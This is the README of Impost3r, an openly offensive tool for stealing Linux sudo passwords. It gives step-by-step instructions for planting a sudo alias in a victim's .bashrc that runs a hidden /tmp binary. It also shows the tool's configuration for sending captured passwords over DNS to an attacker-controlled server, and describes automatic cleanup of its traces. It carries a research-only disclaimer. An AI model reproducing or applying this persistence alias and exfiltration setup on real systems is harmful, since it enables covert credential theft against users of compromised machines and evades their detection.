![imposter.png](https://github.com/ph4ntonn/Impost3r/blob/master/img/Impost3r.png)

# Impost3r

[![GitHub issues](https://img.shields.io/github/issues/ph4ntonn/Impost3r)](https://github.com/ph4ntonn/Impost3r/issues)
[![GitHub stars](https://img.shields.io/github/stars/ph4ntonn/Impost3r)](https://github.com/ph4ntonn/Impost3r/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/ph4ntonn/Impost3r)](https://github.com/ph4ntonn/Impost3r/network)
[![GitHub license](https://img.shields.io/github/license/ph4ntonn/Impost3r?label=license)](https://github.com/ph4ntonn/Impost3r/blob/master/LICENSE)

Impost3r is a tool that aim to steal linux sudo password written by C

Attackers can use Impost3r to make a trap to steal the legal user's sudo password XD

> This tool is limited to security research and teaching, and the user bears all legal and related responsibilities caused by the use of this tool! The author does not assume any legal and related responsibilities!

## Features

- Automatically clean the track
- Use DNS to transfer the result
- Really hard for legal users can feel this attack

## Dependencies

- gcc

## Usage

- First i will assume that attacker has controled a server and the privilege is ordinary user

- Then copy the original .bashrc file ```cp ～/.bashrc /tmp/```,and put this copy anywhere you like(In this case,i will use /tmp/)

- Edit the original .bashrc,and add following sentences at the end of file(The param "/tmp/.impost3r" must be as the same as the following FILENAME you specified):

```
alias sudo='impost3r() {
if [ -f "/tmp/.impost3r" ]; then
/tmp/.impost3r "$@" && unalias sudo
else
unalias sudo;sudo "$@"
fi
}; impost3r'
```

- Then,save it and run ```source ~/.bashrc```

- After that,attacker needs to edit the source code of Impost3r:

```
# define MAX_RESEND 30  \\Set the maximum times that Impost3r will try to resends stealing result to attacker's server
# define RESEND_INTERVAL 5  \\Set the interval of resending stealing result.
# define FILENAME "/tmp/.impost3r"  \\Set the location where the Impost3r is on the server you attack.
# define BACKUP_BASHRC "/tmp/.bashrc" \\Set the location where the backup .bashrc is on the server you attack.
# define REMOTE_ADDRESS "192.168.0.12" \\Set the malicious server ip address that you want to receive stealing result
# define REMOTE_PORT 53 \\Set the malicious server port
```
- Save the source code,and run ```make``` 

- Get the .impost3r file after compiling.

- Upload .impost3r file to the target server and put it under the FILENAME you specified.

- The last thing you should do is run a dns server service on your server(REMOTE_ADDRESS)'s port(REMOTE_PORT),and waiting for the bonus.

## Demo

<img src="https://user-images.githubusercontent.com/45198234/83479347-e88b1700-a4ca-11ea-8230-8ec7e9a66845.gif" width="1200" >

## Attention

- The Dns server progran I use is [Fdns](https://github.com/deepdarkness/Fdns),and I change some params,you can find the changed source code under the ```Fdns``` folder,and use ```gcc -o dns main.c util.c``` to compile it by yourself.And actually you can use any kinds of dns server,but the dns server you use must can make a dns response to client instead of just recording dns request(You also need recording dns request,or you will lose the stealing result). 
- When Impost3r steal the sudo password successfully,it will automatically clean the trace it make on the target server.
- This porject is coding just for fun , the logic structure and code structure are not strict enough, please don't be so serious about it,and also welcome suggestions and prs.

### Thanks

- [Fdns](https://github.com/deepdarkness/Fdns) 
